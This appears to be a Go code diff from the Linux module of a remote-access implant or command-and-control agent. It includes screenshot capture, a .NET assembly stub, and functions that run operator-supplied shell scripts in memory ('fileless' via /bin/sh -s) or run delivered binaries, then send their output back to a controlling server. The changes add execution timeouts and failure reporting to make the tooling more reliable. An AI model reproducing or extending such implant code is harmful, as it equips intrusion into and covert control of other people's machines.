@@ -356,7 +356,7 @@ func captureFrameWithXWD() ([]byte, error) {
 	return []byte("data:image/png;base64," + base64Data), nil
 }
 
-func ExecuteAssembly(assemblyBytes []byte, arguments string) ([]byte, error) {
+func ExecuteAssembly(assemblyBytes []byte, arguments string, execTaskID uint32) ([]byte, error) {
 	return nil, errors.New(".NET程序集执行功能在Linux平台暂不支持")
 }
 
@@ -411,16 +411,31 @@ func TakeScreenshot(quality int) ([]byte, error) {
 }
 
 // ExecuteLinuxScript Linux脚本内存执行(fileless sh -s 管道)
+// unixExecTimeout 插件执行的兜底超时：子进程不退出时不能永久阻塞命令循环。
+const unixExecTimeout = 10 * time.Minute
+
 func ExecuteLinuxScript(scriptBytes []byte, args string) ([]byte, error) {
-	cmd := exec.Command("/bin/sh", "-s")
+	// -s 从 stdin 读脚本；"--" 之后的参数成为脚本的 $1..$N
+	argv := []string{"-s", "--"}
+	if fields := strings.Fields(args); len(fields) > 0 {
+		argv = append(argv, fields...)
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), unixExecTimeout)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, "/bin/sh", argv...)
 	cmd.Stdin = bytes.NewReader(scriptBytes)
 	var stdout bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stdout
 	err := cmd.Run()
-	communication.DataProcess(0, stdout.Bytes())
+	communication.ExecOutput(stdout.Bytes())
 	if err != nil {
-		return []byte(fmt.Sprintf("script error: %v", err)), nil
+		if ctx.Err() == context.DeadlineExceeded {
+			return []byte("script timeout (10m)"), fmt.Errorf("script execution timeout (10m)")
+		}
+		// 返回错误让 dispatch 发送 EXEC_DONE(ok=0)；不能只返回文本，
+		// 否则服务端会按"执行成功"收敛任务。
+		return []byte(fmt.Sprintf("script error: %v", err)), err
 	}
 	return []byte("Linux script executed"), nil
 }
@@ -432,19 +447,24 @@ func ExecuteLinuxBin(binBytes []byte, args string) ([]byte, error) {
 		return nil, err
 	}
 	defer os.Remove(tmpFile)
+	ctx, cancel := context.WithTimeout(context.Background(), unixExecTimeout)
+	defer cancel()
 	var cmd *exec.Cmd
 	if args != "" {
-		cmd = exec.Command(tmpFile, strings.Fields(args)...)
+		cmd = exec.CommandContext(ctx, tmpFile, strings.Fields(args)...)
 	} else {
-		cmd = exec.Command(tmpFile)
+		cmd = exec.CommandContext(ctx, tmpFile)
 	}
 	var stdout bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stdout
 	err := cmd.Run()
-	communication.DataProcess(0, stdout.Bytes())
+	communication.ExecOutput(stdout.Bytes())
 	if err != nil {
-		return []byte(fmt.Sprintf("binary error: %v", err)), nil
+		if ctx.Err() == context.DeadlineExceeded {
+			return []byte("binary timeout (10m)"), fmt.Errorf("binary execution timeout (10m)")
+		}
+		return []byte(fmt.Sprintf("binary error: %v", err)), err
 	}
 	return []byte("Linux binary executed"), nil
 }
@@ -461,19 +481,24 @@ func ExecuteFile(fileBytes []byte, args string) ([]byte, error) {
 		return nil, err
 	}
 	defer os.Remove(tmpFile)
+	ctx, cancel := context.WithTimeout(context.Background(), unixExecTimeout)
+	defer cancel()
 	var cmd *exec.Cmd
 	if args != "" {
-		cmd = exec.Command(tmpFile, strings.Fields(args)...)
+		cmd = exec.CommandContext(ctx, tmpFile, strings.Fields(args)...)
 	} else {
-		cmd = exec.Command(tmpFile)
+		cmd = exec.CommandContext(ctx, tmpFile)
 	}
 	var stdout bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stdout
 	err := cmd.Run()
-	communication.DataProcess(0, stdout.Bytes())
+	communication.ExecOutput(stdout.Bytes())
 	if err != nil {
-		return []byte(fmt.Sprintf("file exec error: %v", err)), nil
+		if ctx.Err() == context.DeadlineExceeded {
+			return []byte("file exec timeout (10m)"), fmt.Errorf("file execution timeout (10m)")
+		}
+		return []byte(fmt.Sprintf("file exec error: %v", err)), err
 	}
 	return []byte("file executed"), nil
 }
